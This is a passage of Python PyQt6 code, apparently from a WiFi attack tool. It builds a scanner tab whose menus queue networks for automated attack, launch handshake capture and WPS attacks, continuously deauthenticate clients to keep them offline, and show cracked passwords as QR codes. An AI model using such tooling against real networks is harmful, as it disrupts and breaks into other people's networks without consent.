            elif power_value >= -70:
                # Fair signal - 3 bars - yellow/orange
                base_color = (255, 191, 0)  # Amber (phone-style warning color)
                bars = "▂▃▅▁▁"
            elif power_value >= -80:
                # Poor signal - 2 bars - orange/red
                base_color = (255, 127, 0)  # Orange
                bars = "▂▃▁▁▁"
            else:
                # Very poor signal - 1 bar - red
                base_color = (255, 69, 58)  # Red (iOS-style critical red)
                bars = "▂▁▁▁▁"

            # Apply color shifting animation
            if use_animation and hasattr(self, 'signal_color_phase'):
                # Calculate color shift based on phase (creates a pulsing/breathing effect)
                import math
                shift_factor = (math.sin(math.radians(self.signal_color_phase)) + 1) / 2  # 0.0 to 1.0

                # Adjust brightness/saturation for pulsing effect
                r = int(base_color[0] * (0.7 + shift_factor * 0.3))
                g = int(base_color[1] * (0.7 + shift_factor * 0.3))
                b = int(base_color[2] * (0.7 + shift_factor * 0.3))

                # Clamp values
                r = min(255, max(0, r))
                g = min(255, max(0, g))
                b = min(255, max(0, b))

                color = f"#{r:02x}{g:02x}{b:02x}"
            else:
                color = f"#{base_color[0]:02x}{base_color[1]:02x}{base_color[2]:02x}"

            return (bars, color, f"{power_value}")

        except (ValueError, IndexError, AttributeError):
            return ("▂▁▁▁▁", "#666666", "??")

    def get_or_create_category_group(self, has_clients: bool):
        """
        Get the appropriate tree root based on whether the network has clients
        With tabs, we don't need category groups anymore - just return the tree root (None)
        """
        # With the new tab-based design, we return None to indicate root of the tree
        # The correct tree (with/without clients) is selected elsewhere
        return None

    def move_network_to_correct_category(self, bssid: str):
        """
        Move a network's SSID group to the correct tab based on whether it has clients
        """
        # Find the AP's SSID group (case-insensitive lookup)
        ap_item = self.ap_tree_items.get(bssid.upper())
        if not ap_item:
            return

        # Get the SSID group (parent of AP item)
        ssid_group = ap_item.parent()
        if not ssid_group:
            return

        # Get SSID key from the SSID group text
        ssid_text = ssid_group.text(0)
        if "━━━ 📡 " in ssid_text:
            ssid = ssid_text.replace("━━━ 📡 ", "")
        else:
            return

        ssid_key = ssid if ssid != "(Hidden Network)" else f"__hidden_{bssid}"

        # Count clients under this SSID group
        client_count = 0
        for i in range(ssid_group.childCount()):
            ap_child = ssid_group.child(i)
            client_count += ap_child.childCount()  # Count clients under each AP

        has_clients = client_count > 0

        # Check if it's in the correct location
        in_with_clients = ssid_key in self.ssid_groups_with_clients
        in_without_clients = ssid_key in self.ssid_groups_without_clients

        # Move if necessary
        if has_clients and in_without_clients:
            # Move from "without clients" to "with clients"
            # Remove from "without clients" tree
            index = self.tree_without_clients.indexOfTopLevelItem(ssid_group)
            if index >= 0:
                self.tree_without_clients.takeTopLevelItem(index)
            del self.ssid_groups_without_clients[ssid_key]

            # Add to "with clients" tree
            self.tree_with_clients.addTopLevelItem(ssid_group)
            self.ssid_groups_with_clients[ssid_key] = ssid_group
            ssid_group.setExpanded(True)

        elif not has_clients and in_with_clients:
            # Move from "with clients" to "without clients"
            # Remove from "with clients" tree
            index = self.tree_with_clients.indexOfTopLevelItem(ssid_group)
            if index >= 0:
                self.tree_with_clients.takeTopLevelItem(index)
            del self.ssid_groups_with_clients[ssid_key]

            # Add to "without clients" tree
            self.tree_without_clients.addTopLevelItem(ssid_group)
            self.ssid_groups_without_clients[ssid_key] = ssid_group
            ssid_group.setExpanded(True)

    def _create_tree_widget(self):
        """Create and configure a tree widget for networks"""
        tree = QTreeWidget()
        tree.setHeaderLabels([
            "BSSID/MAC (Vendor)", "SSID/Info", "Device Type",
            "Channel", "Encryption", "Power", "Attack Score", "WPS",
            "Beacons/Pkts", "Clients", "First Seen", "Last Seen"
        ])
        tree.setColumnWidth(0, 280)  # BSSID/MAC (with icon and vendor)
        tree.setColumnWidth(1, 180)  # SSID/Info
        tree.setColumnWidth(2, 180)  # Device Type
        tree.setColumnWidth(3, 60)   # Channel
        tree.setColumnWidth(4, 120)  # Encryption
        tree.setColumnWidth(5, 60)   # Power
        tree.setColumnWidth(6, 130)  # Attack Score
        tree.setColumnWidth(7, 80)   # WPS
        tree.setColumnWidth(8, 90)   # Beacons/Packets
        tree.setColumnWidth(9, 70)   # Clients
        tree.setColumnWidth(10, 140) # First Seen
        tree.setColumnWidth(11, 140) # Last Seen

        # Enhanced visual styling for better readability
        tree.setAlternatingRowColors(False)  # We'll use custom colors
        tree.setIndentation(25)  # More indentation for hierarchy
        tree.setRootIsDecorated(True)  # Show expand/collapse decorations
        tree.setItemsExpandable(True)
        tree.setUniformRowHeights(False)  # Allow different row heights

        # Add grid lines and spacing for clear separation
        tree.setStyleSheet("""
            QTreeWidget {
                border: 2px solid #444;
                gridline-color: #333;
                outline: none;
            }
            QTreeWidget::item {
                border-bottom: 1px solid #222;
                padding: 4px;
                margin: 1px 0px;
            }
            QTreeWidget::item:selected {
                border: 2px solid #0080ff;
                background: rgba(0, 128, 255, 0.3);
            }
            QTreeWidget::branch {
                background: transparent;
            }
            QTreeWidget::branch:has-siblings:!adjoins-item {
                border-image: none;
                border-right: 1px solid #666;
            }
            QTreeWidget::branch:has-siblings:adjoins-item {
                border-image: none;
                border-right: 1px solid #666;
                border-bottom: 1px solid #666;
            }
            QTreeWidget::branch:!has-children:!has-siblings:adjoins-item {
                border-image: none;
                border-bottom: 1px solid #666;
            }
            QHeaderView::section {
                background-color: #2a2a2a;
                color: white;
                padding: 5px;
                border: 1px solid #444;
                font-weight: bold;
            }
        """)

        # Enable sorting and sort by attack score (descending) by default
        tree.setSortingEnabled(True)
        tree.sortByColumn(6, Qt.SortOrder.DescendingOrder)  # Sort by Attack Score

        # Enable multi-selection for batch operations
        tree.setSelectionMode(QTreeWidget.SelectionMode.ExtendedSelection)

        # Enable context menu
        tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        tree.customContextMenuRequested.connect(self.show_scanner_context_menu)

        return tree

    def init_ui(self):
        """Initialize scanner UI"""
        layout = QVBoxLayout()

        # Header
        header = QLabel("WiFi Scanner - Real-Time Data Acquisition")
        header.setProperty("heading", True)
        layout.addWidget(header)

        # Control panel
        control_panel = QHBoxLayout()

        self.interface_label = QLabel("Interface: Detecting...")
        control_panel.addWidget(self.interface_label)

        control_panel.addStretch()

        # Check if orchestrator is running (24/7 mode)
        import os
        orchestrator_running = os.path.exists('/tmp/gattrose-status.json')

        if orchestrator_running:
            # Viewer mode - show info message instead of controls
            viewer_label = QLabel("📡 24/7 Scanning Active (Managed by Orchestrator)")
            viewer_label.setStyleSheet("font-size: 13px; font-weight: bold; color: #00ff00; padding: 8px; background-color: rgba(0, 255, 0, 0.1); border-radius: 4px;")
            viewer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
            control_panel.addWidget(viewer_label)

            # Create hidden buttons for compatibility
            self.start_btn = QPushButton("Start Scanning")
            self.start_btn.clicked.connect(self.start_scan)
            self.start_btn.setVisible(False)
            self.start_btn.setEnabled(False)

            self.stop_btn = QPushButton("Stop Scanning")
            self.stop_btn.clicked.connect(self.stop_scan)
            self.stop_btn.setVisible(False)
            self.stop_btn.setEnabled(False)
        else:
            # Manual mode - show scan controls
            self.start_btn = QPushButton("Start Scanning")
            self.start_btn.clicked.connect(self.start_scan)
            self.start_btn.setEnabled(False)  # Disabled until interface is ready
            control_panel.addWidget(self.start_btn)

            self.stop_btn = QPushButton("Stop Scanning")
            self.stop_btn.clicked.connect(self.stop_scan)
            self.stop_btn.setEnabled(False)
            control_panel.addWidget(self.stop_btn)

        # Removed "Load History" button - data loads automatically from live database
        # All scan data is now displayed in real-time from current_scan_networks table

        layout.addLayout(control_panel)

        # Statistics panel
        stats_panel = QHBoxLayout()

        self.ap_count_label = QLabel("APs: 0")
        stats_panel.addWidget(self.ap_count_label)

        self.client_count_label = QLabel("Clients: 0")
        stats_panel.addWidget(self.client_count_label)

        stats_panel.addStretch()

        self.status_label = QLabel("Status: Ready")
        stats_panel.addWidget(self.status_label)

        layout.addLayout(stats_panel)

        # Create tabbed interface for networks
        from PyQt6.QtWidgets import QTabWidget
        self.scanner_tabs = QTabWidget()

        # Tab 1: Networks with Clients (high priority)
        self.tree_with_clients = self._create_tree_widget()
        self.scanner_tabs.addTab(self.tree_with_clients, "🎯 Networks with Clients")

        # Tab 2: Networks without Clients (lower priority)
        self.tree_without_clients = self._create_tree_widget()
        self.scanner_tabs.addTab(self.tree_without_clients, "📡 Networks without Clients")

        # Maintain backward compatibility - default to "with clients" tree
        self.tree = self.tree_with_clients

        # Track SSID group items (now separated by tab)
        self.ssid_groups_with_clients = {}  # SSID -> parent tree item (in "with clients" tab)
        self.ssid_groups_without_clients = {}  # SSID -> parent tree item (in "without clients" tab)
        self.ssid_groups = self.ssid_groups_with_clients  # Backward compatibility

        # Track main category groups (deprecated with tabs, but keeping for compatibility)
        self.networks_with_clients_group = None
        self.networks_without_clients_group = None

        layout.addWidget(self.scanner_tabs, stretch=1)

        # Log area
        log_label = QLabel("Scanner Log:")
        layout.addWidget(log_label)

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setMaximumHeight(150)
        layout.addWidget(self.log_area)

        # Text size slider
        text_size_panel = QHBoxLayout()
        text_size_label = QLabel("Text Size:")
        text_size_panel.addWidget(text_size_label)

        self.text_size_slider = QSlider(Qt.Orientation.Horizontal)
        self.text_size_slider.setMinimum(6)
        self.text_size_slider.setMaximum(20)
        self.text_size_slider.setValue(10)
        self.text_size_slider.setTickPosition(QSlider.TickPosition.TicksBelow)
        self.text_size_slider.setTickInterval(2)
        self.text_size_slider.valueChanged.connect(self.on_text_size_changed)
        text_size_panel.addWidget(self.text_size_slider)

        self.text_size_value_label = QLabel("10pt")
        text_size_panel.addWidget(self.text_size_value_label)

        layout.addLayout(text_size_panel)

        self.setLayout(layout)

        # Auto-load live data from database when tab opens
        # Use a single-shot timer to load after UI is fully initialized
        QTimer.singleShot(500, self._auto_start_live_data)

        # GUI is API-only - no direct file access
        # All data comes from orchestrator via API

    def _auto_start_live_data(self):
        """Auto-start live data polling when tab opens"""
        try:
            print("[ScannerTab] Auto-starting live data updates...")

            # Load initial data from database
            self.load_recent_scan_data()

            # Start continuous polling timer (3 seconds for responsive updates)
            if not self.db_poll_timer:
                self.db_poll_timer = QTimer()
                self.db_poll_timer.timeout.connect(self.poll_database)
                self.db_poll_timer.start(3000)  # Poll every 3 seconds for responsive updates
                self.log("✓ Live data polling started (3s interval)")
                print("[ScannerTab] ✓ Live data polling started (3s interval)")

        except Exception as e:
            print(f"[!] Error auto-starting live data: {e}")
            import traceback
            traceback.print_exc()

    def load_recent_scan_data(self):
        """Load and display live scan data from database (current_scan_networks table)"""
        try:
            self.log("Loading live scan data from database...")

            # Simply poll the database to load current scan data
            self.poll_database()

            self.log(f"✓ Loaded {len(self.ap_tree_items)} APs and {len(self.client_tree_items)} clients from live database")

        except Exception as e:
            import traceback
            print(f"[ERROR] Failed to load live data: {e}")
            traceback.print_exc()
            self.log(f"Error loading live data: {e}")

    def set_monitor_interface(self, interface: str):
        """Set the monitor mode interface"""
        self.monitor_interface = interface
        self.interface_label.setText(f"Interface: {interface} ✓")
        self.start_btn.setEnabled(True)
        self.log(f"✓ Monitor interface ready: {interface}")
        self.log(f"✓ Click 'Start Scanning' or scanning will auto-start...")
        self.status_label.setText(f"Status: Ready - Interface {interface}")

    def extract_mac_address(self, decorated_text: str) -> str:
        """
        Extract clean MAC address from decorated text

        Args:
            decorated_text: Text that may contain MAC address with emojis, stars, vendor info, etc.
                           e.g., "🌟🌟🌟🌟🌟 🌐 94:3C:96:EB:21:C7 (Sagemcom Broadband SAS)"

        Returns:
            Clean MAC address (XX:XX:XX:XX:XX:XX) or original text if no MAC found
        """
        import re
        # Match standard MAC address format
        mac_pattern = r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})'
        match = re.search(mac_pattern, decorated_text)
        if match:
            return match.group(1).upper()  # Return MAC in uppercase
        return decorated_text  # Fallback to original if no MAC found

    def show_scanner_context_menu(self, position):
        """Show context menu for scanner tree items"""
        from PyQt6.QtGui import QAction

        item = self.tree.itemAt(position)
        if not item:
            return

        menu = QMenu(self)
        selected_items = self.tree.selectedItems()

        # If multiple items selected, show batch options
        if len(selected_items) > 1:
            batch_queue_action = QAction(f"🎯 Add {len(selected_items)} Selected to Attack Queue", self)
            batch_queue_action.triggered.connect(self.add_selected_to_attack_queue)
            menu.addAction(batch_queue_action)
            menu.exec(self.tree.viewport().mapToGlobal(position))
            return

        # Determine if this is an AP, Client, or Group
        parent = item.parent()
        is_ssid_group = parent is None and item in self.ssid_groups.values()
        is_unassociated_group = parent is None and item == self.unassociated_clients_group
        is_ap = parent is not None and parent in self.ssid_groups.values()
        is_client = (parent is not None and parent not in self.ssid_groups.values()) or (parent == self.unassociated_clients_group)

        # Don't show menu for the unassociated group itself
        if is_unassociated_group:
            return

        if is_ssid_group or is_ap:
            # AP/Network context menu
            # Extract clean MAC address from decorated text (may contain emojis, stars, vendor, etc.)
            bssid_text = item.text(0) if is_ap else item.child(0).text(0) if item.childCount() > 0 else None
            bssid = self.extract_mac_address(bssid_text) if bssid_text else None

            if bssid:
                # PRIMARY ATTACK OPTIONS (Most Common Actions)
                # Add to Auto Attack Queue
                add_queue_action = QAction("🎯 Add to Auto Attack Queue", self)
                add_queue_action.triggered.connect(lambda: self.add_to_auto_attack_queue(bssid))
                add_queue_action.setToolTip("Queue this network for automated attack")
                menu.addAction(add_queue_action)

                # Attack in Manual Mode
                manual_attack_action = QAction("⚔️ Attack in Manual Mode", self)
                manual_attack_action.triggered.connect(lambda: self.attack_in_manual_mode(bssid))
                manual_attack_action.setToolTip("Switch to Manual Attack tab with this network pre-loaded")
                menu.addAction(manual_attack_action)

                menu.addSeparator()

                # SPECIFIC ATTACK OPTIONS (Submenu)
                attack_menu = menu.addMenu("⚡ Quick Attack")

                handshake_action = QAction("📡 Capture Handshake", self)
                handshake_action.triggered.connect(lambda: self.launch_handshake_attack(bssid))
                attack_menu.addAction(handshake_action)

                wps_action = QAction("🔓 WPS Attack", self)
                wps_action.triggered.connect(lambda: self.launch_wps_attack(bssid))
                attack_menu.addAction(wps_action)

                auto_action = QAction("🚀 Full Auto Attack", self)
                auto_action.triggered.connect(lambda: self.launch_auto_attack(bssid))
                attack_menu.addAction(auto_action)

                # Database options
                view_history_action = QAction("📊 View History", self)
                view_history_action.triggered.connect(lambda: self.view_ap_history(bssid))
                menu.addAction(view_history_action)

                # QR Code option (if network is cracked)
                show_qr_action = QAction("📱 Show WiFi QR Code", self)
                show_qr_action.triggered.connect(lambda: self.show_wifi_qr_code(bssid))
                menu.addAction(show_qr_action)

                # WiGLE options
                wigle_menu = menu.addMenu("🌐 WiGLE")

                search_wigle_action = QAction("Search on WiGLE", self)
                search_wigle_action.triggered.connect(lambda: self.search_wigle_for_ap(bssid))
                wigle_menu.addAction(search_wigle_action)

                upload_wigle_action = QAction("Upload to WiGLE", self)
                upload_wigle_action.triggered.connect(lambda: self.upload_ap_to_wigle(bssid))
                wigle_menu.addAction(upload_wigle_action)

                menu.addSeparator()

                # Blacklist options
                blacklist_action = QAction("🚫 Add to Blacklist", self)
                blacklist_action.triggered.connect(lambda: self.blacklist_network(bssid))
                menu.addAction(blacklist_action)

                unblacklist_action = QAction("✅ Remove from Blacklist", self)
                unblacklist_action.triggered.connect(lambda: self.unblacklist_network(bssid))
                menu.addAction(unblacklist_action)

                menu.addSeparator()

                # Copy options
                copy_menu = menu.addMenu("📋 Copy")

                copy_bssid_action = QAction("Copy BSSID", self)
                copy_bssid_action.triggered.connect(lambda: QApplication.clipboard().setText(bssid))
                copy_menu.addAction(copy_bssid_action)

                ssid = item.text(1)
                if ssid:
                    copy_ssid_action = QAction("Copy SSID", self)
                    copy_ssid_action.triggered.connect(lambda: QApplication.clipboard().setText(ssid))
                    copy_menu.addAction(copy_ssid_action)

        elif is_client:
            # Client context menu
            mac = item.text(0)

            # Get parent AP BSSID if this is an associated client
            parent_bssid = None
            parent_item = item.parent()
            if parent_item and parent_item.text(0).count(':') == 5:  # Is an AP
                parent_bssid = parent_item.text(0).split()[-1] if ' ' in parent_item.text(0) else parent_item.text(0)

            # Quick Attack submenu for clients
            attack_menu = menu.addMenu("⚡ Quick Attack")

            # Keep client offline (continuous deauth)
            keep_offline_action = QAction("💥 Keep Client Offline (Deauth)", self)
            keep_offline_action.triggered.connect(lambda: self.launch_keep_client_offline(mac, parent_bssid))
            attack_menu.addAction(keep_offline_action)

            # Single deauth burst
            single_deauth_action = QAction("💨 Single Deauth Burst", self)
            single_deauth_action.triggered.connect(lambda: self.main_window.quick_deauth_client(mac) if self.main_window else None)
            attack_menu.addAction(single_deauth_action)

            menu.addSeparator()

            # Copy MAC
            copy_mac_action = QAction("📋 Copy MAC Address", self)
            copy_mac_action.triggered.connect(lambda: QApplication.clipboard().setText(mac))
            menu.addAction(copy_mac_action)

        # Show menu
        menu.exec(self.tree.viewport().mapToGlobal(position))

    # Attack launch methods
    def launch_handshake_attack(self, bssid: str):
        """Launch handshake capture attack on specified BSSID"""
        self.log(f"🎯 Launching handshake attack on {bssid}")

        # Find tree item for this BSSID to get AP details
        ap_item = self.ap_tree_items.get(bssid.upper())
        if not ap_item:
            QMessageBox.warning(self, "Error", f"Could not find AP data for {bssid}")
            return

        # Extract AP details from tree columns
        # Column 0: BSSID (with icon), Column 1: SSID, Column 4: Channel, Column 5: Encryption
        bssid_text = ap_item.text(0)
        # Remove icon from BSSID (everything after the space)
        bssid_clean = bssid_text.split()[-1] if ' ' in bssid_text else bssid_text

        ssid = ap_item.text(1)
        if ssid == "(Hidden)":
            ssid = ""

        channel = ap_item.text(4)
        encryption = ap_item.text(5).split()[0]  # Get encryption type without cipher

        # Load target into manual attack tab
        self.manual_attack_tab.load_target(bssid_clean, ssid, channel, encryption)

        # Switch to manual attack tab
        self.tabs.setCurrentWidget(self.manual_attack_tab)

        self.log(f"✅ Loaded {bssid_clean} into manual attack tab")

    def launch_wps_attack(self, bssid: str):
        """Launch WPS attack on specified BSSID"""
        self.log(f"🔓 Launching WPS attack on {bssid}")

        # Find tree item for this BSSID to get AP details
        ap_item = self.ap_tree_items.get(bssid.upper())
        if not ap_item:
            QMessageBox.warning(self, "Error", f"Could not find AP data for {bssid}")
            return

        # Extract AP details from tree columns
        bssid_text = ap_item.text(0)
        bssid_clean = bssid_text.split()[-1] if ' ' in bssid_text else bssid_text

        ssid = ap_item.text(1)
        if ssid == "(Hidden)":
            ssid = ""

        channel = ap_item.text(4)
        encryption = "WPS"  # Force WPS encryption type

        # Load target into manual attack tab
        self.manual_attack_tab.load_target(bssid_clean, ssid, channel, encryption)

        # Switch to manual attack tab
        self.tabs.setCurrentWidget(self.manual_attack_tab)

        self.log(f"✅ Loaded {bssid_clean} (WPS attack) into manual attack tab")

    def launch_auto_attack(self, bssid: str):
        """Add BSSID to auto attack queue"""
        self.log(f"🚀 Adding {bssid} to auto attack queue")

        # Find tree item for this BSSID to get AP details
        ap_item = self.ap_tree_items.get(bssid.upper())
        if not ap_item:
            QMessageBox.warning(self, "Error", f"Could not find AP data for {bssid}")
            return

        # Extract AP details from tree columns
        bssid_text = ap_item.text(0)
        bssid_clean = bssid_text.split()[-1] if ' ' in bssid_text else bssid_text

        ssid = ap_item.text(1)
        if ssid == "(Hidden)":
            ssid = ""

        channel = ap_item.text(4)
        encryption = ap_item.text(5).split()[0]  # Get encryption type without cipher

        # Add to auto attack queue
        self.auto_attack_tab.queue_target(bssid_clean, ssid, channel, encryption)

        # Switch to auto attack tab
        self.tabs.setCurrentWidget(self.auto_attack_tab)

        self.log(f"✅ Added {bssid_clean} to auto attack queue")

    def add_selected_to_attack_queue(self):
        """Add all selected APs to auto attack queue (batch operation)"""
        selected_items = self.tree.selectedItems()
        added_count = 0
        skipped_count = 0

        for item in selected_items:
            # Skip if this is a client or group header
            parent = item.parent()
            is_ssid_group = parent is None and item in self.ssid_groups.values()
            is_client = (parent is not None and parent not in self.ssid_groups.values())

            if is_client:
                skipped_count += 1
                continue

            # Extract BSSID - handle both AP items and group items
            bssid = None
            if is_ssid_group:
                # Get first child AP's BSSID
                if item.childCount() > 0:
                    bssid_text = item.child(0).text(0)
                    import re
                    mac_match = re.search(r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})', bssid_text)
                    bssid = mac_match.group(1) if mac_match else None
            else:
                # Extract from AP item
                bssid_text = item.text(0)
                import re
                mac_match = re.search(r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})', bssid_text)
                bssid = mac_match.group(1) if mac_match else None

            if not bssid:
                skipped_count += 1
                continue

            # Get AP details
            ap_item = self.ap_tree_items.get(bssid.upper())
            if not ap_item:
                skipped_count += 1
                continue

            ssid = ap_item.text(1)
            if ssid == "(Hidden)":
                ssid = ""

            channel = ap_item.text(3)  # Channel is column 3 after vendor removal
            encryption = ap_item.text(4).split()[0]  # Encryption is column 4

            # Add to queue
            self.auto_attack_tab.queue_target(bssid, ssid, channel, encryption)
            added_count += 1

        # Show result and switch to auto attack tab
        if added_count > 0:
            self.log(f"✅ Added {added_count} targets to attack queue ({skipped_count} skipped)")
            self.tabs.setCurrentWidget(self.auto_attack_tab)
            QMessageBox.information(
                self,
                "Batch Queue",
                f"Added {added_count} targets to attack queue\n{skipped_count} items skipped (clients/groups)"
            )
        else:
            QMessageBox.warning(self, "No Targets", "No valid AP targets were selected")

    # Database methods
    def view_ap_history(self, bssid: str):
        """View AP history from database"""
        self.log(f"📊 Viewing history for {bssid}")
        # TODO: Open database tab with filter
        QMessageBox.information(self, "History", f"Viewing history for {bssid}")

    def blacklist_network(self, bssid: str):
        """Add network to blacklist"""
        from PyQt6.QtWidgets import QInputDialog, QMessageBox
        from src.database.models import get_session, Network

        # Extract BSSID from display text (remove icons and vendor info)
        clean_bssid = bssid.split()[0] if ' ' in bssid else bssid
        clean_bssid = clean_bssid.replace('🌐', '').replace('📡', '').strip()

        try:
            session = get_session()
            network = session.query(Network).filter_by(bssid=clean_bssid).first()

            if not network:
                # Create new network entry if it doesn't exist
                network = Network(bssid=clean_bssid)
                session.add(network)

            if network.blacklisted:
                QMessageBox.information(
                    self,
                    "Already Blacklisted",
                    f"{clean_bssid} is already on the blacklist."
                )
                session.close()
                return

            # Ask for reason
            reason, ok = QInputDialog.getText(
                self,
                "Blacklist Network",
                f"Enter reason for blacklisting {clean_bssid}:",
                text="User blacklisted"
            )

            if ok:
                network.blacklisted = True
                network.blacklist_reason = reason if reason else "User blacklisted"
                session.commit()

                self.log(f"🚫 Blacklisted: {clean_bssid} - Reason: {reason}")
                QMessageBox.information(
                    self,
                    "Blacklisted",
                    f"{clean_bssid} has been added to the blacklist.\n\nReason: {reason}\n\n"
                    "This network will be excluded from attacks."
                )

            session.close()

        except Exception as e:
            QMessageBox.critical(
                self,
                "Blacklist Failed",
                f"Failed to blacklist network:\n{str(e)}"
            )

    def unblacklist_network(self, bssid: str):
        """Remove network from blacklist"""
        from PyQt6.QtWidgets import QMessageBox
        from src.database.models import get_session, Network

        # Extract BSSID from display text
        clean_bssid = bssid.split()[0] if ' ' in bssid else bssid
        clean_bssid = clean_bssid.replace('🌐', '').replace('📡', '').strip()

        try:
            session = get_session()
            network = session.query(Network).filter_by(bssid=clean_bssid).first()

            if not network or not network.blacklisted:
                QMessageBox.information(
                    self,
                    "Not Blacklisted",
                    f"{clean_bssid} is not on the blacklist."
                )
                session.close()
                return

            network.blacklisted = False
            network.blacklist_reason = None
            session.commit()

            self.log(f"✅ Removed from blacklist: {clean_bssid}")
            QMessageBox.information(
                self,
                "Removed from Blacklist",
                f"{clean_bssid} has been removed from the blacklist.\n\n"
                "This network can now be targeted for attacks."
            )

            session.close()

        except Exception as e:
            QMessageBox.critical(
                self,
                "Unblacklist Failed",
                f"Failed to unblacklist network:\n{str(e)}"
            )

    def show_wifi_qr_code(self, bssid: str):
        """Show WiFi QR code for cracked network"""
        try:
            from src.database.models import get_session, Network
            from .wifi_qr_dialog import WiFiQRDialog

            session = get_session()
            try:
                # Query network from database
                network = session.query(Network).filter_by(bssid=bssid).first()

                if not network:
                    QMessageBox.warning(
                        self,
                        "Network Not Found",
                        f"Network {bssid} not found in database.\n\n"
                        "The network must be saved to the database first."
                    )
                    return

                if not network.password:
                    QMessageBox.information(
                        self,
                        "Network Not Cracked",
                        f"No password available for {network.ssid or bssid}.\n\n"
                        "This network has not been cracked yet."
                    )
                    return

                # Show QR code dialog
                dialog = WiFiQRDialog(
                    ssid=network.ssid or "Hidden Network",
                    password=network.password,
                    encryption=network.encryption or "WPA",
                    parent=self
                )
                dialog.exec()

            finally:
                session.close()

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to show QR code:\n{e}")

    # WiGLE methods
    def search_wigle_for_ap(self, bssid: str):
        """Search WiGLE for AP"""
        self.log(f"🌐 Searching WiGLE for {bssid}")
        # TODO: Open WiGLE tab with search
        QMessageBox.information(self, "WiGLE", f"Searching WiGLE for {bssid}")

    def upload_ap_to_wigle(self, bssid: str):
        """Upload AP to WiGLE"""
        self.log(f"📤 Uploading {bssid} to WiGLE")

        try:
            from src.database.models import get_session, Network
            import csv
            from pathlib import Path
            from datetime import datetime

            session = get_session()
            network = session.query(Network).filter_by(bssid=bssid).first()

            if not network:
                session.close()
                QMessageBox.warning(self, "Error", f"Network {bssid} not found in database")
                return

            # Create temporary CSV file in WiGLE format
            temp_dir = Path.cwd() / "data" / "exports"
            temp_dir.mkdir(parents=True, exist_ok=True)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            csv_file = temp_dir / f"wigle_upload_{bssid.replace(':', '')}_{timestamp}.csv"

            # WiGLE CSV format (WigleWifi-1.4)
            with open(csv_file, 'w', newline='') as f:
                writer = csv.writer(f)

                # Header
                writer.writerow([
                    'MAC', 'SSID', 'AuthMode', 'FirstSeen', 'Channel', 'RSSI',
                    'CurrentLatitude', 'CurrentLongitude', 'AltitudeMeters',
                    'AccuracyMeters', 'Type'
                ])

                # Data row
                # Map our encryption to WiGLE AuthMode
                auth_mode = network.encryption or "Open"
                if "WPA3" in auth_mode.upper():
                    auth_mode = "[WPA3-SAE-CCMP][ESS]"
                elif "WPA2" in auth_mode.upper():
                    auth_mode = "[WPA2-PSK-CCMP][ESS]"
                elif "WPA" in auth_mode.upper():
                    auth_mode = "[WPA-PSK-TKIP][ESS]"
                elif "WEP" in auth_mode.upper():
                    auth_mode = "[WEP][ESS]"
                elif "OPN" in auth_mode.upper() or not network.encryption:
                    auth_mode = "[ESS]"

                # Format timestamp (WiGLE expects: YYYY-MM-DD HH:MM:SS)
                first_seen = network.first_seen.strftime("%Y-%m-%d %H:%M:%S") if network.first_seen else ""

                # Get signal strength (default to 0 if not available)
                rssi = network.current_signal if network.current_signal else 0

                # GPS coordinates (0,0 if not available - WiGLE requires them)
                lat = network.latitude if network.latitude else 0.0
                lon = network.longitude if network.longitude else 0.0
                alt = network.altitude if network.altitude else 0.0
                accuracy = network.gps_accuracy if network.gps_accuracy else 0.0

                writer.writerow([
                    network.bssid,
                    network.ssid or "",
                    auth_mode,
                    first_seen,
                    network.channel or "",
                    rssi,
                    lat,
                    lon,
                    alt,
                    accuracy,
                    "WIFI"
                ])

            session.close()

            self.log(f"✅ Created WiGLE export file: {csv_file.name}")

            # Ask user if they want to upload now or just save the file
            reply = QMessageBox.question(
                self,
                "Upload to WiGLE",
                f"WiGLE export file created:\n{csv_file}\n\n"
                f"Network: {network.ssid or '(Hidden)'}\n"
                f"BSSID: {network.bssid}\n\n"
                "Would you like to upload to WiGLE now?\n"
                "(Make sure you've configured your API key in the WiGLE tab)",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.Yes
            )

            if reply == QMessageBox.StandardButton.Yes:
                # Switch to WiGLE tab and set the file
                for i in range(self.tab_widget.count()):
                    if self.tab_widget.tabText(i) == "WiGLE":
                        wigle_tab = self.tab_widget.widget(i)
                        # Set the file path in the upload field
                        wigle_tab.upload_file_input.setText(str(csv_file))
                        # Switch to WiGLE tab
                        self.tab_widget.setCurrentIndex(i)
                        self.log(f"📤 Switched to WiGLE tab - ready to upload {csv_file.name}")

                        # Optionally auto-trigger upload if API key is configured
                        if wigle_tab.api_key_input.text().strip():
                            wigle_tab.upload_to_wigle()
                        else:
                            QMessageBox.information(
                                self,
                                "API Key Required",
                                "Please configure your WiGLE API key first,\n"
                                "then click the 'Upload Selected' button."
                            )
                        break
            else:
                QMessageBox.information(
                    self,
                    "File Saved",
                    f"WiGLE export saved to:\n{csv_file}\n\n"
                    "You can upload it later from the WiGLE tab."
                )

        except Exception as e:
            self.log(f"❌ Error creating WiGLE export: {e}")
            QMessageBox.critical(self, "Error", f"Failed to create WiGLE export:\n{e}")

    def on_text_size_changed(self, value: int):
        """Handle text size slider change"""
        self.text_size_value_label.setText(f"{value}pt")

        # Update font for entire tree widget
        font = QFont()
        font.setPointSize(value)
        self.tree.setFont(font)

        # Update header font
        header_font = QFont()
        header_font.setPointSize(value)
        header_font.setBold(True)
        self.tree.header().setFont(header_font)

        # Update all existing items
        iterator = QTreeWidgetItemIterator(self.tree)
        while iterator.value():
            item = iterator.value()

            # Check if this is a parent SSID group or child item
            if item.parent() is None and item in self.ssid_groups.values():
                # SSID group parent - make it larger and bold
                parent_font = QFont()
                parent_font.setBold(True)
                parent_font.setPointSize(value + 1)
                for i in range(13):
